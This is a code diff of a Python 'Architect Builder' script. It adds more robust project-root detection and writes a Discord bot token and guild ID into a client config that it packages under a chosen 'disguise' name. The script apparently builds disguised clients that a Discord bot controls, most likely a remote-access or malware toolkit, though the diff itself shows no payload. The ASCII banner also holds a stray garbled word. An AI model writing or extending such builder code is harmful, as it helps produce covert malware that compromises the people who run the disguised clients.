@@ -72,7 +72,7 @@ def display_banner():
 ╚██████╗██║  ██║██║        ██║   ██║  ██║██║██║ ╚████║    ██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
  ╚═════╝╚═bottom═╝╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
 [/bold cyan]
-[bold white]                         - Architect Builder v3.0 - [/bold white]
+[bold white]                         - Architect Builder v3.1 - [/bold white]
     """
     console.print(Panel(banner, border_style="cyan", padding=(1, 2)))
 
@@ -204,10 +204,22 @@ def build(token, guild_id, preset_name, disguise_name):
         if os.path.exists("build_staging"):
             shutil.rmtree("build_staging")
         
-        # We need to copy the 'src' directory from the project root
+        # Robust project root detection
+        # 1. Try current working directory
         project_root = os.getcwd()
         src_path = os.path.join(project_root, "src")
         
+        # 2. Try parent directory (if running from builder/)
+        if not os.path.exists(src_path):
+            project_root = os.path.dirname(os.getcwd())
+            src_path = os.path.join(project_root, "src")
+            
+        # 3. Try grandparent directory (if running from builder/compiler or similar)
+        if not os.path.exists(src_path):
+            project_root = os.path.dirname(os.path.dirname(os.getcwd()))
+            src_path = os.path.join(project_root, "src")
+
+        # 4. Fallback to package resources
         if not os.path.exists(src_path):
              import pkg_resources
              try:
@@ -218,7 +230,7 @@ def build(token, guild_id, preset_name, disguise_name):
         if os.path.exists(src_path):
             shutil.copytree(src_path, "build_staging/src")
         else:
-            console.print("[bold red]Error:[/bold red] Could not find 'src' directory. Please run from the project root.")
+            console.print(f"[bold red]Error:[/bold red] Could not find 'src' directory in {project_root} or parent dirs.")
             return
         
         # Step 2: Injection
@@ -226,8 +238,13 @@ def build(token, guild_id, preset_name, disguise_name):
         config_path = "build_staging/src/client/core/config.py"
         with open(config_path, "r") as f:
             content = f.read()
-        content = content.replace("[[DISCORD_TOKEN_PLACEHOLDER]]", token)
-        content = content.replace("[[GUILD_ID_PLACEHOLDER]]", guild_id)
+        
+        # Use the exact placeholders from config.py
+        token_placeholder = "TOKEN_PLACEHOLDER_64_BYTES____________________________________"
+        guild_placeholder = "GUILD_ID_PLACEHOLDER_32_BYTES_______"
+        
+        content = content.replace(token_placeholder, token)
+        content = content.replace(guild_placeholder, guild_id)
         
         # Inject Developer Mode
         if preset.get("developer", False):
